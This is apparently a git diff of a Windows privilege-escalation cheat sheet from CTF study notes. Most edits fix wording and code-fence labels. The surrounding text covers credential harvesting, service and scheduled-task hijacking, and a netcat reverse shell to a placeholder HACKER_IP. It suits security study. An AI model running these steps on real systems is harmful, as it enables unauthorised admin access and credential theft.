@@ -14,7 +14,7 @@ As there isn't much we can do as a regular user, we will try to elevate our leve
 * Missing security updates <small>(vulnerable OS, software...)</small>
 * Find vulnerable scheduled tasks/services
 
-The **goal is to pop out a powershell/cmd as root** (root shell), basically, the same as selecting "run as administrator" for one of them.
+The **goal is to pop out a PowerShell/CMD as root** (root shell), basically, the same as selecting "run as administrator" for one of them.
 
 </div><div>
 
@@ -24,7 +24,7 @@ There are many **automated scripts** that will investigate usual places, service
 * [PrivescCheck](https://github.com/itm4n/PrivescCheck) (1.8k ⭐)
 * [PowerUp](https://github.com/HarmJ0y/PowerUp) (222⭐) that was deprecated over [PowerTools](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp) (1.8k ⭐) that was deprecated again over [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) (10k ⭐) which is now archived 😂. PowerUp from PowerSploit is still used.
 
-```bash
+```powershell
 PS> .\winPEASany_ofs.exe
 PS> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 PS> powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
@@ -45,14 +45,14 @@ Aside from commands that are in the Windows notes, here are a few used in cybers
 * `hostname`: see hostname
 * `ipconfig`: network configuration
 * `netstat`: monitor network traffic
-* `systeminfo`: see infos about the system
+* `systeminfo`: see info about the system
 </div><div>
 
 * `Get-LocalGroup`: list groups (users, administrators...)
 * `Get-LocalUser`:list users
 * `net localgroup users`:list users in the group "users"
 * `net localgroup administrators`: list administrators
-* `net user username`: infos about an user
+* `net user username`: info about a user
 
 > Change the keyboard language to French: `Set-WinUserLanguageList -LanguageList  fr-FR, en-US -force` ([source](https://stackoverflow.com/questions/56820526/how-to-change-keyboard-layout-in-windows-console-cmd-or-wsl)).
 </div></div>
@@ -91,7 +91,7 @@ Exploit User Account Control (UAC) which is the popup prompted when trying to ru
 
 * ➡️ List saved credentials by Windows
 
-```bash
+```powershell
 PS> cmdkey /list
 # use to start a root shell
 PS> runas /savecred /user:admin cmd.exe
@@ -99,7 +99,7 @@ PS> runas /savecred /user:admin cmd.exe
 
 * ➡️ See the shell history
 
-```bash
+```powershell
 PS> type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 CMD> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
@@ -113,7 +113,7 @@ CMD> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
 
 * ➡️ List credentials saved by applications
 
-```bash
+```powershell
 # Internet Information Services (IIS) = the default web server
 PS> type C:\inetpub\wwwroot\web.config | findstr connectionString
 PS> type C:\Windows\Microsoft.NET\Framework64\vX.X.XXXXX\Config\web.config | findstr connectionString
@@ -155,13 +155,13 @@ PS> type C:\Program Files\FileZilla Server\FileZilla Server.xml
 
 List scheduled tasks
 
-```bash
+```powershell
 PS> schtasks
 ```
 
 Then, you can query more info on a task (ex: `example_task`) with
 
-```bash
+```powershell
 PS> schtasks /query /tn example_task /fo list /v
 ```
 
@@ -169,7 +169,7 @@ PS> schtasks /query /tn example_task /fo list /v
 
 The **Task To Run** is the most important. If you can inject or edit the binary, then you must find another task. The **Run As User** will help when considering a task over another.
 
-```bash
+```powershell
 # check permissions
 PS> icacls task_to_run
 # ex: replace the binary
@@ -178,7 +178,7 @@ CMD> echo %temp%\nc64.exe -e cmd.exe HACKER_IP PORT > task_to_run
 
 In CTF, instead of waiting, you may be able to start the task manually.
 
-```bash
+```powershell
 PS> schtasks /run /tn taskname
 ```
 </div></div>
@@ -195,7 +195,7 @@ Windows services are managed by the Service Control Manager (SCM). You can use s
 
 * 🗺️ List services
 
-```bash
+```powershell
 PS> Get-Service
 CMD> powershell -c "Get-Service"
 ```
@@ -215,7 +215,7 @@ SERVICE_NAME: xxx
 
 In CTF, you are usually able to start/stop the service manually
 
-```bash
+```powershell
 PS> sc.exe stop xxx
 # do your job
 PS> sc.exe start xxx
@@ -225,15 +225,15 @@ PS> sc.exe start xxx
 
 * ➡️ Insecure permissions: the current user may be able to replace the service with a malicious executable (ex: revshell.exe)
 
-```bash
+```powershell
 PS> icacls C:\[...]\service.exe
 PS> move C:\[...]\service.exe C:\[...]\service.exe.old
 PS> icacls C:\[...]\malicious.exe /grant Everyone:F
 ```
 
-* ➡️ Unquoted Service Paths: if the service is using a PATH in which there is spaces, the service isn't quoted, and the hacker can create files, then the hacker may create an executable that is executed with the rest of the path in argument.
+* ➡️ Unquoted Service Paths: if the service is using a PATH in which there are spaces, the service isn't quoted, and the hacker can create files, then the hacker may create an executable that is executed with the rest of the path in argument.
 
-```bash
+```powershell
 PS> icacls $Env:appdata\Vulnerable Program\service.exe
 PS> move C:\[...]\malicious.exe $Env:appdata\Vulnerable.exe
 # the service will execute
@@ -242,7 +242,7 @@ PS> move C:\[...]\malicious.exe $Env:appdata\Vulnerable.exe
 
 * ➡️ Insecure Service Permissions: if we can edit the permissions of a service, for instance, to change the location of the binary. See [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk). If the user is granted `SERVICE_ALL_ACCESS` on the service, then have fun. 
 
-```bash
+```powershell
 # LocalSystem is the highest privileged account available
 PS> sc.exe config xxx binPath=C:\[...]\malicious.exe  obj= LocalSystem
 ```
@@ -256,7 +256,7 @@ PS> sc.exe config xxx binPath=C:\[...]\malicious.exe  obj= LocalSystem
 
 The Volume Shadow Copy Service (VSS) is handling the creation, and management of **shadow copies**/**snapshot** of the data backed up.  They are stored in the volume information of each drive that has the feature enabled.
 
-They may allow a system admin to restore the system after an attack. So, hackers will most likely check them, and delete them. There may exist a "offline" version of these shadow copies.
+They may allow a system admin to restore the system after an attack. So, hackers will most likely check them, and delete them. There may exist an "offline" version of these shadow copies.
 </div><div>
 
 To manage them
@@ -273,7 +273,7 @@ To manage them
 
 <div class="row row-cols-md-2"><div>
 
-On a file system using NTFS, ADS allow files to have more than one stream (`flux`) of data. By default, every file has only one stream: **:$DATA**. You can inspect a file using
+On a file system using NTFS, ADS allows files to have more than one stream (`flux`) of data. By default, every file has only one stream: **:$DATA**. You can inspect a file using
 
 ```powershell
 > Get-Item -Path SomeFile -Stream *
@@ -290,7 +290,7 @@ Length        : 0
 ```
 </div><div>
 
-They can be used by Windows to store data, such as identifier on a file telling the operating system that this file was download from the Internet.
+They can be used by Windows to store data, such as identifiers telling Windows that this file was downloaded from the Internet.
 
 Hackers can use that to store malicious code inside a file. They can execute it like this later, for instance using a legit/non-malicious application
 
@@ -321,7 +321,7 @@ PS> msiexec /quiet /qn /i $Env:TMP\malicious.msi
 
 <hr class="sep-both">
 
-## 👻 TODO 👻
+## 👻 To-do 👻
 
 Stuff that I found, but never read/used yet.
 
@@ -339,6 +339,6 @@ Checklists
 * [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) (3.4k ⭐) + `winadbasics`
 </div><div>
 
-* `/Windows/System32/config/`: location where the Security Account Manager (**SAM**) database file is stored. This file is used to store users, their passwords, their groups... Modern versions of Windows use the NT hash format, commonly referred as NTLM, as the previous format was LM.
+* `/Windows/System32/config/`: location where the Security Account Manager (**SAM**) database file is stored. This file is used to store users, their passwords, their groups... Modern versions of Windows use the NT hash format, commonly referred to as NTLM, as the previous format was LM.
 * [Windows credential guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-how-it-works)
 </div></div>
